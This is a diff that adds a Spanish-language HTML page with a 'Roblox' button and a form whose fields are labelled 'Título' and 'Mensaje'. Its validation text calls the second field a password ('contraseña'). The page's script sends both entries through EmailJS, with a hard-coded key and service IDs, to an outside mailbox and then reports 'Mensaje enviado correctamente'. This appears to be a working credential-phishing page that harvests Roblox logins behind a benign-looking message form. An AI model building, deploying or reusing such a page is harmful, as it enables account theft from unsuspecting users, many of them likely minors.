@@ -1,1 +1,196 @@
+<!DOCTYPE html><html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>T¹X</title><script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script><style>
 
+body {
+font-family: Arial, sans-serif;
+margin: 0;
+padding: 0;
+color: #0f172a;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+flex-direction: column;
+overflow: hidden;
+}
+
+/* Fondo animado */
+body::before {
+content: "";
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: linear-gradient(-45deg, #ffffff, #e0f2fe, #bfdbfe, #ffffff);
+background-size: 400% 400%;
+animation: gradientMove 12s ease infinite;
+z-index: -1;
+}
+
+@keyframes gradientMove {
+0% { background-position: 0% 50%; }
+50% { background-position: 100% 50%; }
+100% { background-position: 0% 50%; }
+}
+
+h1 {
+color: #2563eb;
+font-size: 40px;
+margin-bottom: 30px;
+}
+
+button {
+background: #2563eb;
+color: white;
+border: none;
+padding: 15px 35px;
+font-size: 18px;
+border-radius: 10px;
+cursor: pointer;
+transition: 0.3s;
+}
+
+button:hover {
+background: #1d4ed8;
+transform: scale(1.05);
+}
+
+.form-container {
+display: none;
+margin-top: 30px;
+background: rgba(255,255,255,0.9);
+backdrop-filter: blur(10px);
+padding: 25px;
+border-radius: 12px;
+box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+width: 300px;
+opacity: 0;
+transform: translateY(20px);
+transition: 0.4s ease;
+}
+
+.form-container.show {
+display: block;
+opacity: 1;
+transform: translateY(0);
+}
+
+input, textarea {
+width: 100%;
+padding: 12px;
+margin-top: 10px;
+border-radius: 8px;
+border: 1px solid #cbd5e1;
+font-size: 14px;
+}
+
+textarea {
+resize: none;
+height: 100px;
+}
+
+.send-btn {
+margin-top: 15px;
+width: 100%;
+}
+
+.error {
+color: red;
+font-size: 12px;
+margin-top: 5px;
+}
+
+.success {
+color: green;
+font-size: 12px;
+margin-top: 5px;
+}
+
+</style></head>
+<body><h1>T¹X</h1><button onclick="mostrarFormulario()">Roblox</button>
+
+<div class="form-container" id="formulario"><input type="text" id="titulo" placeholder="Título" required><textarea id="mensaje" placeholder="Mensaje (mínimo 8 caracteres)" required></textarea><div class="error" id="error"></div>
+<div class="success" id="success"></div><button class="send-btn" onclick="enviarCorreo()">Aceptar</button>
+
+</div><audio id="openSound" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3" preload="auto"></audio> <audio id="sendSound" src="https://assets.mixkit.co/active_storage/sfx/1435/1435-preview.mp3" preload="auto"></audio>
+
+<script>
+
+(function() {
+emailjs.init("cBp3yrNbbEcOVwJIo");
+})();
+
+let ultimoEnvio = 0;
+
+function mostrarFormulario() {
+let form = document.getElementById("formulario");
+form.classList.add("show");
+
+let sonido = document.getElementById("openSound");
+sonido.volume = 0.3;
+sonido.play();
+
+// vibración suave
+if (navigator.vibrate) {
+navigator.vibrate(30);
+}
+}
+
+function enviarCorreo() {
+
+let ahora = new Date().getTime();
+let titulo = document.getElementById("titulo").value;
+let mensaje = document.getElementById("mensaje").value;
+let error = document.getElementById("error");
+let success = document.getElementById("success");
+
+if(ahora - ultimoEnvio < 20000){
+error.textContent = "Espera unos segundos antes de enviar otra solicitud";
+success.textContent = "";
+return;
+}
+
+if(mensaje.length < 8){
+error.textContent = "La contraseña debe tener mínimo 8 caracteres";
+success.textContent = "";
+return;
+}
+
+error.textContent = "";
+
+let templateParams = {
+titulo: titulo,
+mensaje: mensaje
+};
+
+emailjs.send("service_a1kj56q","template_qos16nt", templateParams)
+.then(function(response) {
+
+success.textContent = "Mensaje enviado correctamente";
+
+let sonido = document.getElementById("sendSound");
+sonido.volume = 0.3;
+sonido.play();
+
+// vibración al enviar
+if (navigator.vibrate) {
+navigator.vibrate([40, 20, 40]);
+}
+
+
+document.getElementById("titulo").value = "";
+document.getElementById("mensaje").value = "";
+ultimoEnvio = new Date().getTime();
+
+}, function(error) {
+error.textContent = "Error al enviar";
+});
+
+}
+
+</script></body>
+</html>
